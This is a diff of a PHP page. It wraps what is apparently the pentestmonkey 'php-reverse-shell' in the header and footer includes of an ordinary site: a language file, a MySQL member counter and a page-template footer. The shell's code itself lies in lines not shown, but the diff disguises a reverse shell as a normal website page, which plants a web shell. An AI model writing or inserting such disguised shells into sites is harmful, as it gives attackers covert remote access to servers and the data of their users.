@@ -1,4 +1,29 @@
 <?php
+//ini_set('display_errors', 1);
+//error_reporting(E_ALL);
+//if(strlen(stristr($_SERVER['HTTP_HOST'],"topcpm")) > 0){ echo "TOPCPM"; exit; }
+
+include $_SERVER['DOCUMENT_ROOT'] . "/functions.php";
+include "langue.php"; 
+
+if(!empty($_GET['test'])){ $test = $_GET['test']; setcookie("test", $test, time()+300, "/"); }
+elseif(empty($_REQUEST['test'])){ $test = "0"; }
+
+include "sqlcf_masterserver.php";
+
+mysql_connect($host,$user,$pass);
+mysql_select_db("widgeo_compteur2");
+$r_members = mysql_fetch_array(mysql_query("select nombre from widgets where nom='members'"));
+mysql_close();
+
+$page = "accueil";
+if(!isset($tab)){$tab = "count_geo";}
+?>
+
+
+
+
+<?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 //
@@ -188,5 +213,5 @@ function printit ($string) {
 
 ?> 
 
-
+<?php include "index-bas.php";?>
 
